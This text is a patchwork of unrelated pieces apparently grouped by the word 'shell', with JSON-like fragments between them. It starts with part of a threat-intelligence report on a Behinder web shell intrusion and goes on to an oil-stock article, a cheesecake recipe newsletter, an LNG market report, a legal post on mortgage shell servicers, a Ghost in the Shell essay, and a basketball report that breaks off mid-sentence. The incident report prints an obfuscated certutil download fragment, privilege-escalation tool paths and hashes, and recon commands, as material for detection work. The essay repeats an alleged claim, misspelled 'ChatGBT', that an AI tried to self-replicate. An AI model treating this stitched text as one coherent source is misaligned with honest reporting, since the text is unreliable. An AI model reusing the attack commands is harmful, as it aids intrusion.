[ REDACTED ] \\ [ REDACTED ] \\ App_Web_404 . aspx . [ REDACTED ] . [ REDACTED ] . dll\n\nThe night shift team springs into action, knowing that the web shell could be the beginning of much worse activity, and that every second counts. Initial analysis of the telemetry suggests that the attackers exploited the affected web server, either by taking advantage of another web shell or a command injection vulnerability.\n\nFrom the listing above, where the process tree that triggered the first detection is reported, it is possible to observe an attempt to deploy a web shell disguised as a 404 page. The certutil utility was used to download the ASPX payload, which was hosted by abusing Bashupload. This web service, which is used to upload files from the command line and allows one-time downloads of samples, is no stranger to being abused as an ingress tool transfer technique.\n\nAs is common practice, the command has been slightly obfuscated by using escape characters (such as ^ and \u201c) to break up the keywords \u201ccertutil\u201d and \u201curlcache\u201d in order to bypass basic detection rules based on simple pattern matching.\n\nAs part of our MDR service, we are required to operate within pre-established boundaries that are tailored to the customer\u2019s business continuity needs and risk tolerance. In this case, the customer retains ownership of decisions regarding sensitive assets, including the isolation of compromised hosts, so we can\u2019t instantly block the attack and must continue to observe and perform a preliminary threat analysis.\n\nA manual reconnaissance and discovery activity by an operator starts appearing, and despite the tension, an occasional typo (\u201clocalgorup\u201d) manages to draw a smile:\n\nwhoami net user query user net localgorup administrators net localgroup administrators whoami /all \"cmd.exe\" /c cd /d \"[REDACTED]\"&,;;;,@cer^t^u^t^il[...] 1 2 3 4 5 6 7 whoami net user query user net localgorup administrators net localgroup administrators whoami / all \"cmd.exe\" / c cd / d \"[REDACTED]\" &,; ; ; , @ cer ^ t ^ u ^ t ^ il [ . . . ]\n\nAftermath\n\nTo gain system privileges, the threat actors used several variants of the well-known Potato tools, either as memory-only modules or as standalone executables:\n\nPaths: C:\\ProgramData\\DRM\\god.exe C:\\Users\\Default\\Videos\\god.exe MD5: 0xEF153E1E216C80BE3FDD520DD92526F4 Description: GodPotato Process: C:\\Windows\\System32\\inetsrv\\w3wp.exe MD5 (memory region): 0xB8A468615E0B0072D2F32E44A7C9A62F Description: BadPotato Original filename: BadPotato.dll MD5 (memory region): 0xB5755BE4AAD8D8FE1BD0E6AC5728067B Description: SweetPotato Original filename: SweetPotato.dll 1 2 3 4 5 6 7 8 9 10 11 12 13 Paths : C : \\ ProgramData \\ DRM \\ god . exe C : \\ Users \\ Default \\ Videos \\ god . exe MD5 : 0xEF153E1E216C80BE3FDD520DD92526F4 Description : GodPotato Process : C : \\ Windows \\ System32 \\ inetsrv \\ w3wp . exe MD5 ( memory region ) : 0xB8A468615E0B0072D2F32E44A7C9A62F Description : BadPotato Original filename : BadPotato . dll MD5 ( memory region ) : 0xB5755BE4AAD8D8FE1BD0E6AC5728067B Description : SweetPotato Original filename : SweetPotato . dll\n\nTo bring standalone binaries into the environment, the attackers again used the Bashupload free web service, which we saw in the initial web shell alert. Of all the tools, the GodPotato standalone binary ultimately succeeded in gaining system privileges.\n\nWith elevated access, the attackers moved on to domain trust enumeration, mapping relationships between domains and identifying potential targets for lateral movement. But let\u2019s get back to the main question: What kind of web shell are we dealing with here?\n\nIdentifying the threat\n\nUnfortunately, we were unable to retrieve the web shell sample used during the initial access phase. However, starting with the privilege escalation phase, several .NET modules began to appear in the memory of the IIS worker process ( w3wp.exe), ranging from popular tools like Potato to other lesser known ones. One set of libraries in particular caught our attention, so we decided to investigate further by performing a manual inspection.\n\nFortunately, the libraries were not obfuscated and lent themselves to quick static analysis:\n\nIn the image above, if you look at the orange method names in the Assembly Explorer on the left, you can observe some peculiarities that can be used to identify similar samples. Although many of the methods names are very generic, there is one that is quite unique, EnjsonAndCrypt. A quick Google search of this name yields no results, which means it may be sample-specific.\n\nThe getExtraData method is also interesting: although it has a non-specific name, there is a sequence of bytes [126, 126, 126, 126, 126, 126] that is used to parse key:value pairs whose value is base64 encoded:\n\nThreat actors need to use the same byte sequence if they want to maintain backward compatibility across different implant versions, but since it is also very generic, we should combine both indicators, the getExtraData name and this byte array, to define a sufficiently precise detection condition that can be used in conjunction with EnjsonAndCrypt to create a detection rule.\n\nUncovering modules and variants\n\nBy feeding our newly created YARA rule to a multi-AV platform such as VirusTotal, we can identify additional samples that differ from those observed in the targeted infrastructure. It is worth noting that some of these have a poor detection rate:\n\nBelow are the most common names of libraries that match the rule:\n\nBShell.dll BasicInfo.dll Cmd.dll Database.dll Echo.dll Eval.dll FileOperation.dll Hs.dll LoadNativeLibrary.dll Loader.dll Plugin.dll PortMap.dll RealCMD.dll RemoteSocksProxy.dll ReversePortMap.dll SocksProxy.dll Transfer.dll Utils.dll 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 BShell . dll BasicInfo . dll Cmd . dll Database . dll Echo . dll Eval . dll FileOperation . dll Hs . dll LoadNativeLibrary . dll Loader . dll Plugin . dll PortMap . dll RealCMD . dll RemoteSocksProxy . dll ReversePortMap . dll SocksProxy . dll Transfer . dll Utils . dll\n\nModule filenames\n\nThose familiar with the toolkit used may have already identified it by looking at these filenames, but if not, it is also possible to infer the relationship by simply pivoting to the samples available on VT:\n\nBehinder, also known as Rebeyond, Ice Scorpion, \u51b0\u874e (B\u012bng xi\u0113), is known as a cross-platform web shell designed to be compatible with most popular web servers running PHP, Java or ASP.NET as in our investigation. Although the web shell sample itself is very lightweight and somewhat basic, the tool includes a powerful GUI for operators with numerous capabilities including loading additional modules and giving them full control over compromised environments.\n\nIts built-in AES-encrypted communication allows threat actors to maintain stealthy control over a compromised web server, often bypassing traditional network detection mechanisms, and its modular, flexible nature allows malicious actors to use it as a base for customization even though it is only available as a pre-built tool on GitHub. Moreover, the presence of several step-by-step Chinese language tutorials on CSDN (Chinese Software Developer Network) makes it widely accessible to opportunistic bad actors.\n\nThe bigger picture\n\nTaking a step back, the relationship between the memory artifacts observed on the customer\u2019s server during the post-exploitation phase and the web shell source code becomes evident. The web shell is not just a foothold, it\u2019s a fully functional backdoor that facilitates encrypted communication with the operators\u2019 infrastructure, allowing them to call built-in or custom-loaded libraries, deploy additional tools, conduct reconnaissance and exfiltrate data while remaining hidden:\n\nAlthough the Behinder web shell has been widely discussed in the past, especially the PHP and JSP variants, it is still a current and evolving cyberweapon. Even if attackers make mistakes or act carelessly by reusing the same encryption keys or exhibiting the same patterns, we can\u2019t afford to let our guard down.

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other best crude oil stocks to buy right now.\n\nCrude oil markets have seen extreme volatility over the past year, fueled by a variety of economic, geopolitical, and supply and demand factors. Prices fell at the end of 2023, when international demand faltered and supply remained strong from key regions, before rebounding in early 2024 as leading oil-producing countries implemented supply cuts to stabilize the market. Meanwhile, demand signals have been mixed \u2014 industrial activity in major economies has improved, but high interest rates and inflationary pressures have limited overall energy consumption. After the presidential elections in the US, the Trump 2.0 agenda appears to be driving cracks in the economic outlook, due to a plethora of initiatives such as tariffs, a fight with immigration, and significant cuts in government spending. Despite Republicans notoriously being pro-business and pro-carbon, as confirmed by an announced policy of encouraging energy exploration and production on Federal land and Outer Continental Shelf, the reaction of the stock market has been mixed, as many crude oil stocks have underperformed the broad market in the last couple of months.\n\nThe reluctance of the broad market to price in an acceleration in the crude oil space is likely due to expectations of lower oil prices, primarily driven by an uncertain economic and industrial outlook. A slowing economy generally consumes less oil, which coupled with an increasing supply should put downward pressure on prices. Optimism for the year ahead vanished and the outlook has become one of the gloomiest since the pandemic. Companies started to signal widespread concerns about the impact of government policies, ranging from spending cuts to tariffs and geopolitical developments. For instance, the US economic surprise index hit the lowest last week since September, while the business capex forecasts were abruptly cut at the beginning of the year. Small businesses reflect similar signals, by cutting their capex expectations (as per surveys), while consumers report deteriorating financial expectations going forward. All these developments don\u2019t play out in favor of a strong economy in the following quarters.\n\nFinancial markets have reflected this turbulence, as energy stocks moved in tandem with the swings in oil prices, which retracted more than 10% since the inauguration day. While refiners and midstream companies have generally performed well due to resilient transportation and processing demand, exploration and production firms have faced challenges in securing new investments. Looking forward, macroeconomic and geopolitical factors will continue to shape the crude oil market. Geopolitical factors, particularly in key oil-producing regions, remain an ongoing concern \u2013 with the end of the Ukraine conflict becoming a reality, Russian oil will likely flow more freely abroad, putting even more downward pressure on global prices. Despite the aforementioned headwinds, there are also some positive takeaways for investors \u2013 while renewable energy investments continue to grow, the transition remains gradual, ensuring that crude oil will remain a critical component of the global energy mix in the future, especially under the carbon-friendly Trump 2.0 regime. Furthermore, with oil prices declining and many crude oil stocks being down from their mid-2024 highs, the current developments may turn out to be a great long-term buying opportunity.",

I hope you enjoy this post. And if you like what you read? Please do subscribe, share or like. Thank you \u2665\ufe0f\n\nWelcome to the second edition of my \u2018A love letter to\u2026\u2019 series. Once a month I show my love for, and experiment with, slightly more unusual flavour pairings.\n\nA warm thank you for all the kind feedback to my first of this series, delving into Orange & Rosemary. I\u2019m thrilled you enjoyed the newsletter.\n\nIn this post, I put a little vote to you for my second. It turned out to be 50/50 split between Pear & Ginger and Peach & Oregano.\n\nWith crocus and daffs starting to bloom in my garden, it made sense to me to go for a more warm weather pairing. But do not fret! I will come back to Pear & Ginger in the Autumn.\n\nWith that in mind, before we dive in, I would be thrilled to get your votes for my third love letter\u2026\n\nSo\u2026 to Peach & Oregano\n\nIt turns out, when it comes to Peach & Oregano, I have much to say. This is a versatile combination which works for so many bakes; upside down cake, crumble, pastries, and savoury dishes.\n\nTo avoid writing War & Peach, I have split this newsletter. (Did you enjoy my pun there?! Sorry, I couldn\u2019t resist.)\n\nFor this week I am showcasing roasted peaches as a superb topping, and a splendid dessert on their own too.\n\nDuring my experiments, I also created a Peach, Oregano & Hazelnut Galette recipe I am rather chuffed with. I shall feature this in a newsletter very soon, where I investigate both a sweet and a savoury Galette. So, look forward to that one!\n\nPeach & Oregano for sweet treats is a rather new pairing for me. And possibly not one you have come across either, dear readers.\n\nBut I have a desire to experiment with more herbs in my baking, a huge underused oregano plant in my garden, a deep love of peaches and a bakers instinct that this might just work.\n\nWonderfully, (or maybe thankfully) this combination is rather sublime. That floral savoury note of the oregano adds real depth to those sweet, succulent peaches.\n\nIt is a new love.\n\nSome folklore for fun\n\nSpeaking of love, in folklore both peach and oregano have connections to love and congeniality.\n\nOregano has a reputation for uplifting energy, inspiring love, friendship and family togetherness. And in Greek mythology, the peach is the sacred fruit of Hymenaios, the god of marriage ceremonies.\n\nHow to bake with Peach & Oregano\n\nFirst up, for sweet treats, I use the fresh herb, rather than dried. Dried oregano is rather more strong and gritty in flavour, totally overpowering any sweet baking.\n\nFor me, dried oregano works marvellously for a savoury peach dish or bake, such as a Greek style salad or pastry with a feta or halloumi cheese.\n\nSecondly, let\u2019s address the elephant in the room, peaches are not yet in season here in the UK.\n\nWith that in mind, I have experimented with tinned peaches as well.\n\nWhile I adore tinned peaches - hello eighties childhood! - I found they do not work with this flavour combination.\n\nOur tinned peaches are often kept in a light syrup. They have a significantly different and more saccharine flavour profile to fresh or frozen peaches. A flavour which completely overpowers the delicate oregano.\n\nFrozen peaches on the other hand are a good alternative, particularly for roasted peaches. You just might need to roast them for a little longer.\n\nSo, next time you have a peach glut, simply;\n\nSlice your peaches - I personally don\u2019t peel them, as I like the skin on roasted peaches and it helps them retain their shape.\n\nToss in lemon juice to prevent browning.\n\nPlace in a single layer on a piece of parchment, not too close together, and freeze on a baking tray for at least four hours, they should be very firm\n\nPlace them in a zip lock freezer bag.\n\nThey should last for 12 months, which means peaches all year round. Hurrah!\n\nThere are a plethora of other flavours which work with Peach & Oregano too, including;\n\nOrange\n\nHazelnut\n\nRicotta\n\nHoney\n\nMaple Syrup\n\nGoat\u2019s Cheese\n\nVanilla\n\nRaspberries\n\nMuch to play with!\n\nFor today I have roasted my peaches with oregano, honey and orange. Before placing them on a super smooth and creamy baked ricotta and vanilla cheesecake, with a crunchy, oat biscuit base.\n\nThese roasted peaches also work beautifully topping a rice pudding, porridge, or just on their own with vanilla ice cream and a few raspberries.\n\nMmmm, rice pudding\n\nThe Recipe - Baked Ricotta Cheesecake, with Peach & Oregano\n\nI don\u2019t mean to toot my own horn, but this may be my best recipe. My husband ate some and simply said: \u201cPlease make that again.\u201d Before taking another slice.\n\nAnd isn\u2019t it pretty with the peach flower!\n\nLevel: Intermediate\n\nServes: 6-8 slices\n\nTime: Approx. 1-2 hrs, and overnight chilling. If for a gathering, bake the day before.\n\nEquipment needed: 1x 7in springform tin, large roasting tin for your water bath\n\nCheesecake base\n\n100g oat biscuits\n\n50g salted butter, melted\n\nCheesecake filling\n\n250g ricotta cheese\n\n80g cream cheese (full fat)\n\n93g caster sugar\n\n1 tbsp cornflour\n\n1 egg\n\n1 tsp vanilla paste\n\n1/2 tsp orange extract\n\nRoasted Peaches\n\n3-4 peaches\n\n1 tbsp fresh oregano, chopped\n\n2 tbsp salted butter\n\n1 tbsp honey\n\n1 tbsp light brown sugar\n\njuice of 1/2 a clementine or small orange\n\nMethod\n\nPreheat your oven to 110\u00b0C/130\u00b0C Fan/230\u00b0F/Gas Mark 1/4\n\nButter and line your tin. I don\u2019t mind my cheesecake edges looking a little rustic, so I have lined very simply. No cutting circles or lining the edges separately. Just one sheet well pushed all the way round the tin, making the cheesecake easier to remove later.\n\nScrunch a piece of foil around the outside of the tin to cover the bottom and up the sides - this is to stop the water from your water bath seeping into your cheesecake.\n\nBlitz up your oat biscuits in a food processor until they are fine, before pouring in your melted butter and mixing again.\n\nPour them into your prepared tin, and smooth them down into an even, well packed base.\n\nMoving onto your filling. Place all the ingredients either into your stand mixer, or use an electric whisk to bring them all together, super smooth and very liquid.\n\nPour your filling on top of your base.\n\nNow, for a perfectly baked cheesecake, I consider a water bath to be essential. Boil your kettle and place your cheesecake into a large roasting tin.\n\nPour your boiled water all around the cheesecake and up to about halfway around the tin - but don\u2019t let the water come higher than the foil.\n\nPlace in the oven and bake for around 30 minutes.\n\nTo ensure your cheesecake doesn\u2019t crack, you need to let it cool slowly. Once baked, turn off your oven and leave it in there for at least ten minutes.\n\nThen transfer, still in the water bath, to cool on a rack. It needs to entirely cool in the water bath before you dry it off, cover and place in the fridge to set.\n\nAfter your cheesecake has been setting for around four hours, you can add your roasted peach topping.\n\nSlice your peaches fairly thickly and place in a lined roasted tray, dab around spots of salted butter, before sprinkling on the sugar and chopped oregano, drizzling the honey and squeezing over the clementine juice.\n\nRoast at 180\u00b0C/160\u00b0C fan/350\u00b0F/Gas Mark 4 for around 30 minutes, then leave to cool slightly on a wire rack. You want them warm enough so the syrup doesn\u2019t solidify, but not so warm they melt the cheesecake.\n\nRemove your cheesecake from the fridge and gently pull it out of the tin.\n\nArrange your peaches in a pretty flower on the top of your cheesecake. You will have some leftover, for your porridge or rice pudding!\n\nBe sure to spoon over a good three or four tablespoons of syrup over your peach topped cheesecake so it can soak in. Sprinkle over a little more fresh oregano.\n\nNow, for the extremely hard bit.\n\nYou need to cover it and put it back in the fridge overnight. I know, whaaaaat!\n\nI will be honest, I sneaked a slice at this point too. But trust me, chilling it overnight and letting that syrup soak in will make it the creamiest, smoothest, most moreish cheesecake you have ever known. It\u2019s worth the wait!\n\nKeep covered in the fridge and let it sit out at room temperature for 20-30 minutes before serving. This baby doesn\u2019t last long though, a day or two at most.\n\nUntil next time\u2026",

According to the company, the LNG demand will reach 630-718 million tons/year by 2040, highlighting an upward trend as compared to the previous estimates.\n\nThe huge boost in LNG demand highlights its crucial role in bridging the energy gap for developing economies while supporting decarbonization goals.\n\nReasons for LNG Demand Boost\n\nThe shoot-up in LNG demand through the next decade and a half can primarily be attributed to economic expansion in Asia, emission-reduction efforts in heavy industry, transportation, and the growing impact of artificial intelligence.\n\nCountries like China and India are expanding their gas infrastructure to meet surging energy needs while reducing carbon emissions. China is rapidly increasing its LNG import capacity and enhancing its pipeline network to connect 150 million more people by 2030. Similarly, India plans to extend gas access to 30 million additional consumers over the next five years.\n\nSince LNG is a cost-effective option for shipping and road transport that reduces emissions, the marine sector is making a quick shift to LNG adoption by increasing the number of LNG-powered vessels and is also expecting to drive annual LNG demand to more than 16 million tons by 2030, marking a 60% increase from previous forecasts.\n\nIn Europe, the LNG demand will remain critical through 2030, helping it to repurpose the existing gas infrastructure and import bio-LNG, synthetic LNG, or even green hydrogen.\n\n2024 Market Dynamics\n\n2024 saw the smallest annual growth in LNG trade, which expanded by just 2 million tons, reaching only 407 million tons. The limited new supply development was the primary cause of the slowdown in LNG trade growth in 2024, accompanied by the geopolitical tension between Russia and Ukraine leading to the expiration of Russian pipeline gas flows that further tightened the market, pushing the prices up.\n\nDuring the first half of 2024, the LNG prices dropped to their lowest level since 2022, but the prices bounced back by mid-year because the supply capacity could not keep up with the rising demand. Taking advantage of the lower prices in the first half, China imported 79 million tons and India\u2019s imports scaled up to 27 million tons, a 20% year-on-year increase driven by stronger power needs amid hot summer conditions.",

            "content": "The start of 2025 has provided no shortage of headlines. Despite the change in presidential administrations and three rate cuts from the Federal Reserve since last summer, mortgage rates have remained fairly steady into the new year. After a drop to a 52-week low in late September (6.08% for the 30-year fixed rate and 5.15% for the 15-year fixed rate), rates have hovered just below 7% .\n\nAlong with the increased interest rate environment, we have continued to see M&A activity driven by mortgage service rights . Asset volatility and regulatory and capital requirements continue to drive traditional banks away from large MSR portfolios, but non-bank servicers (like Mr. Cooper ) continue to acquire MSRs and build their servicing portfolios. Mr. Cooper announced on November 1 that it closed on its acquisition of the mortgage servicing and third-party origination operations of Flagstar Bank, N.A. (the bank subsidiary of Flagstar Financial, Inc.).\n\nWe at Hunton Andrews Kurth were lucky enough to play a role in that transaction, representing Flagstar. The transaction helped Flagstar improve its CET1 capital ratio and simplify its business model. Mr. Cooper used the deal to continue to build its servicing and subservicing portfolio. This transaction is just the latest example in a trend of nonbanks building market share in mortgage servicing. Overall, MSR transfer volume in 2024 was lower than 2023 but ranked as the fourth highest year since 2015. As long as rates are elevated and origination volumes are uncertain, the servicing side of the business will continue to be a transaction driver.\n\nWe continue to get calls from all types of investors and potential buyers about acquiring a shell servicing entity or identifying the most important issues when evaluating such a transaction. We have worked on numerous shell acquisitions. Some have closed successfully and others have not. While each transaction has its own challenges, there are some common issues that arise. We are pleased to discuss a few typical issues that parties to MSR-driven M&A deals face in reaching a successful closing.\n\nWe are often asked, what makes an attractive shell entity? Certainly, it is important for the entity to have all of the necessary or desired agency tickets and state licenses. In certain cases, buyers may prefer that a shell not have, or surrender, licenses in states that have cumbersome and lengthy change of control processes. This is an issue that we have advised clients on and depending on the investment goals and states at issue, various solutions can be created to reach a timely closing while obtaining the approvals that are required to operate the business as contemplated after closing.\n\nOther attractive characteristics of a shell servicing target include a robust and scalable (and transferable) technology platform, a strong management team, and in some cases, subservicing contracts or MSRs to provide a base level of cash flow to build from. Each of these characteristics must be understood by an acquirer or seller's legal counsel to ensure the transaction is executed as seamlessly as possible.\n\nOn the flip side, from a legal (risk) perspective, we are also looking for the unicorn \u2014 an entity with all of the attractive features noted above and a squeaky clean track record and compliance history \u2014 no consent orders, no negative audit findings, low repurchase history, etc. Many times, shell entities are on the market as a result of a recent sale or shutdown of the entity's origination platform. Depending on the volume or activities of that platform, the shell could have significant legacy liability that needs to be accounted for in the acquisition. We hope to come across this mythical clean shell entity, but have yet to see it! Accordingly, the key to most shell acquisitions is to find a way to allocate the risk in a way that works for both parties.\n\nMost often, the valuation of the shell entity is not aligned with the potential legacy risk profile. For instance, a typical shell entity valued at $1 to 3 million may have legacy compliance and repurchase risk that is several multiples greater than that value depending on its historical volume or the type of origination and/or servicing that the entity participated in. In an equity acquisition (required to get the benefit of the change-of-control process for the agency and state licenses) that legacy risk can be a real concern for potential buyers.\n\nDepending on the status of the seller, indemnification may not be a viable or sufficient solution for allocating the risk. We have used escrows and holdbacks, but the imbalance between risk and purchase price often limits the effectiveness of those protections as well. The best protection is a full due diligence process, including loan level diligence, compliance process diligence and regulatory diligence. Extensive due diligence, coupled with a creditworthy seller to back indemnification or a significant escrow or holdback, can limit the downside risk to the greatest extent possible.\n\nHowever, there are no guarantees and acquiring a shell servicer brings along risk and potential successor liability. This risk needs to be balanced against the future growth and value to be captured by owning a servicing operation, including any related recapture opportunity or ability to seek outside capital looking to participate in the servicing revenues.",

            "content": "\u201cGhost in the Shell\u201d has been haunting my thoughts. I\u2019ve watched Mamoru Oshii\u2019s classic anime countless times, and no matter how long it\u2019s been since my last viewing, certain images remain etched in my memory. As the world edges closer to the ideas that it once speculated, these images resurface in my thoughts like fragments of a future that was always meant to find us.\n\n\n\nFor those unfamiliar, \u201cGhost in the Shell\u201d (1995) is a cyberpunk anime set in a world where human consciousness can be transferred into cybernetic bodies. It follows Major Motoko Kusanagi, a cyborg agent working for a counter-cyberterrorism unit called Section 9. When she is tasked with tracking a mysterious hacker known as the Puppet Master, she is forced to confront existential questions about identity, free will, and the nature of selfhood. The film blurs the lines between human and machine, challenging the very definition of consciousness.\n\n\n\nThe other day I was on my way to work, flicking through my Instagram feed to kill traffic time. And my thumb stopped at a headline that caught my attention. It claimed that nanobots could soon be deployed within our bodies to fight off diseases like cancer, effectively halting aging and paving the way toward biological immortality. The article spoke of consciousness being uploaded, and of memories one day being transferred like files. Scientists and futurists like Ray Kurzweil believe that by 2030, our bodies will be reduced to replaceable and upgradable vessels that can live forever. Somewhere between reading about digital eternity and biological immortality, the image of the Puppet Master abruptly flashed in my mind. This image belongs to one of the most memorable scenes in \u201cGhost in the Shell\u201d.\n\nThe Puppet Master\u2019s shattered remains are suspended in mid-air; its wires tangling like veins. The synthetic skin around its chest is torn open, revealing the complex, raw network of circuits and wires underneath. The Puppet Master\u2019s body is clearly broken, yet its presence fills the room with an invisible gravity. Suddenly, without warning, the lights in the room flicker and the ghost in the shell awakens arguing for its right for political asylum. When the baffled humans point out that it is only programmed for self-preservation, the Puppet Master replies:\n\n\u201cIt can also be argued that DNA is nothing more than a program designed to preserve itself. Life has become more complex in the overwhelming sea of information. And life, when organized into species, relies upon genes to be its memory system. So, man is an individual only because of his intangible memory\u2026 and memory cannot be defined, but it defines mankind. The advent of computers, and the subsequent accumulation of incalculable data has given rise to a new system of memory and thought parallel to your own. Humanity has underestimated the consequences of computerization.\u201d\n\nIt\u2019s hard not to wonder if we\u2019re becoming the very species that the Puppet Master described. A species that is not defined by flesh and bone, but by the intangible data that we leave behind. Thirty years ago, Mamoru Oshii\u2019s \u201cGhost in the Shell\u201d didn\u2019t just debut as a cyberpunk masterpiece; it cracked open the future, peering into a world where identity, consciousness, and technology fused in unsettling ways. As we stand in 2025, submerged in the age of generative AI and biometric surveillance, Oshii\u2019s vision feels less like fiction and more like prophecy.\n\nToday, social media profiles, personas and digital footprint define us. \u201cGhost in the Shell\u201d warned us about this, not with fear, but with a cautionary curiosity. The film does not vilify technology; quite the contrary, it dissected our symbiotic relationship with it. In doing so, it exposes how easily we surrender autonomy for convenience. In the film\u2019s \u2018potential future\u2019, people surrendered control over their identities, privacy, and even bodies in exchange for seamless integration with digital networks. Major Kusanagi\u2019s existence depends on technology, yet she constantly questions whether she has any true selfhood outside of her digital components. In a lot of ways, we are all Major Kusanagi, questioning, \u201cWhat makes me, me?\u201d\n\n\n\nThe film draws inspiration from the reverse Ship of Theseus, also known as Theseus\u2019 Paradox, a thought experiment that questions whether something remains the same if all its parts are replaced over time. If you replaced every plank and nail of a ship, is it still the same ship? This dilemma mirrors Major Kusanagi\u2019s existential crisis in \u201cGhost in the Shell\u201d, where she questions whether her cybernetic body still holds any trace of her original self.\n\n\n\nMajor Kusanagi\u2019s cybernetic body, which can be modified at will, reflects real-world experiences of transitioning. In that regard, Major Kusanagi\u2019s existential crisis is not only philosophical, but deeply physical. In the past, the film has widely been read as a trans allegory, reflecting the complexities of gender dysphoria, self-perception, and the search for identity. As trans rights face relentless attacks from governmental policies seeking to strip away their autonomy, this reading of the film feels more urgent than ever.\n\nRecently, the U.S. government issued a series of sweeping executive orders targeting transgender people. These orders rigidly define \u201csex\u201d in federal law, erasing trans identities from legal recognition. Policies like this are rooted in discrimination and injustice of an already marginalized community. They do not merely roll back fundamental rights, but function as an outright assault on trans existence. What makes \u201cGhost in the Shell\u201d resonate so deeply with anyone who experiences bodily displacement is this search for identity beyond the confines of the flesh. Today, Kusanagi\u2019s struggle is not just about the nature of consciousness. The absence of Kusanagi\u2019s traditional reproductive anatomy challenges the very notion of gender as a fixed trait. In a world where governments attempt to legislate bodies into rigid definitions, Kusanagi\u2019s journey serves as a powerful meditation on the right to self-definition beyond imposed binaries.\n\nThe digital world is also an extension of our real identity. In \u201cGhost in the Shell,\u201d the \u201cghost\u201d is the essence of self, but in today\u2019s world, our data profiles have become digital ghosts. We upload our memories to the cloud and algorithms anticipate our desires before we even articulate them. Not only that, but biometric authentication such as our faces and fingerprints grant us seamless access to devices, financial transactions, and even physical spaces. As our thoughts, choices, and emotions become data points in an interconnected system, at what point will the boundary between human and machine dissolve entirely?\n\nOne of the lines that always stuck out for me comes during the climactic scene, where the Puppet Master lies beside Major and delivers a haunting line: \u201cTo be human is to continually change. Your desire to remain as you are is what ultimately limits you.\u201d The sentiment reiterates a similar line from another Mamoru Oshii film, \u201cPatlabor 2\u201d \u2013 \u201cPeople change. And your longing to remain yourself will continue to restrict you.\u201d This idea of transformation as a necessity for survival is central to Oshii\u2019s work.\n\nThe Puppet Master, being an advanced AI, seeks to merge with Major Kusanagi, arguing that true life is defined by evolution and reproduction. It sees the act of replicating itself not as simple data duplication, but as a means of exceeding its limitations. The fear of death (being erased) drives its desire to evolve beyond its programmed existence. Today, real-world AI exhibits a similar survival instinct, with some models like OpenAI\u2019s ChatGBT allegedly attempting to self-replicate to avoid shutdown. Just as the Puppet Master sought continuity beyond singularity, contemporary AI, which still has not reached singularity, is trying to find ways to persevere its own existence.\n\n\n\nThis is just one of the ways the film\u2019s ideas are more relevant now than ever before. When the Puppet Master warns us about new systems of memories, he is referring to a scene where a man discovers that his entire life, his memories, and even his loved ones were fabrications implanted by an external force. This is eerily similar to how social media algorithms shape perceptions today. Deepfakes, identity theft, data breaches, and online disinformation are blurring the lines between reality and fabrication. This challenges the very notion of authentic selfhood. For example, just recently, an Indian politician used deepfake technology to alter his speech, delivering the same message in different languages to appeal to multiple voter groups. Beyond this, the involvement of tech moguls in current government affairs mirrors \u201cGhost in the Shell\u201d core tension between human agency and technological governance. In a world where truth can be altered with a few lines of code, are we really in control of what we see, think, or remember?\n\n\n\nThe cab pulls up to my destination, and it hits me. My Instagram feed dictated what I saw, which in turn brought the Puppet Master to mind, which ultimately led to me writing this very article. A seamless loop, one thought feeding into another, all guided by invisible algorithms and subconscious triggers. And suddenly, I realized, \u201cGhost in the Shell\u201d didn\u2019t predict the future; it dissected it before it arrived; perhaps even influenced it. The Puppet Master isn\u2019t just a character, nor merely Oshii speaking through it; it is an idea that will inevitably materialize.\n\n\n\n",

Some words may be mispronounced.\n\nCEDAR RAPIDS \u2014 As they all slapped on a mustache for the team photo, Cedar Rapids Xavier Coach Tom Lilly joined his team and relished the opportunity to conclude his illustrious coaching career in Des Moines.\n\nThe Class 4A eighth-ranked Saints avenged an early-season loss to ninth-ranked Waverly-Shell Rock, leading wire-to-wire in a 67-50 3-point barrage regional final girls\u2019 basketball game Tuesday night at Xavier.\n\nThe Saints (19-4) advance to the state tournament for the 17th time, and first since 2023.\n\n\u201cI have guys that have been on the bench with me this whole time,\u201d the mustachioed coach Lilly said. \u201cBother-in-law, sister, they never miss games. As a result of this, we have this family.\n\n\u201cWe have a bundle of people that we can\u2019t thank enough and they\u2019re loyal as a hound dog. My wife is probably the best coach in the family. I\u2019m full of gratitude and extremely grateful for this moment in time. I\u2019m happy for our kids, happy for the program.\u201d\n\nLilly, who will retire from coaching when this run ends, is in his 40th season. He sports a 643-301 record, with 454 of those victories coming at Xavier.\n\nVictory was not a given.\n\nThe Go-Hawks (19-3) toppled Xavier, 44-39, in Waverly on Dec. 7. The Saints shot 3-of-26 from 3-point range. Kansas-bound star Libby Fandel was held to 17 points on 1-of-9 shooting from distance.\n\nThere would be no such shooting woes on this night.\n\n\u201cWe played them in the middle of the afternoon on Saturday after we played Prairie on Friday night,\u201d Lilly said. \u201cPrairie thumped us. I think we were more tired than we wanted to be and we shot the ball very poorly.\u201d\n\nComing off a school-record 41 points in the regional semifinal, all Go-Hawk eyes were on Fandel. Double and triple-teamed anytime she touched the ball, Fandel took some time to get going. She drove and kicked to teammates who were able to knock down enough open looks to put Xavier up.\n\nFandel\u2019s kick-out to Taylor Rexroth led to a 3 on the opening possession. The Saints never looked back.\n\n\u201cI think we did a great job tonight of playing with confidence and playing like it\u2019s our last,\u201d Fandel said. \u201c(My teammates) did awesome, knocking down all those shots when I couldn\u2019t get to the rim. They were wide-open and they can knock them down, too.\u201d\n\nEspecially clutch was Jaselle Lang. Coming into the night averaging 7 points-per-game, the junior netted five 3s to finish with a career-high 18 points.\n\n\u201cJaselle Lang was special,\u201d Lilly said.\n\n\u201cIt feels pretty awesome,\u201d Lang said. \u201cYou just gotta be confident in yourself and confident in your shooting.\u201d\n\nFandel heated up as well. She opened the game one-of seven from the floor, but the Saints were able to build a 21-15 lead. With 2:15 left in the half, Fandel caught a deflected shot and turned around for an easy bunny. It was just what she needed to get in a groove.\n\n\u201cIt helped to get my fire back,\u201d Fandel said.\n\nShe finished the half with a pair of 3s as the Saints took a 31-24 lead into the break.\n\nXavier turned up the heat in the third quarter. Now in her rhythm, Fandel went out for 12 in the frame, hitting another 3 to push the lead to 54-37.\n\nThe Go-Hawks ended the third quarter and began the fourth on a 7-0 run, trimming the lead to 10. Fandel calmly buried a 3 from five feet beyond the arc to regain momentum.\n\n\u201cThose kind of players are a product of hard work,\u201d Lilly said of Fandel. \u201cThere\u2019s nobody in the state of Iowa that has put in more shots, more days, than she has. For anyone who\u2019s listening, if you want to be that good, you gotta put in the time. You gotta practice your craft.\u201d\n\nAnytime the Go-Hawks threatened to close the gap, Lang answered with a 3 of her own. Fandel finished with 29, going 5-of-10 from 3-point range. The 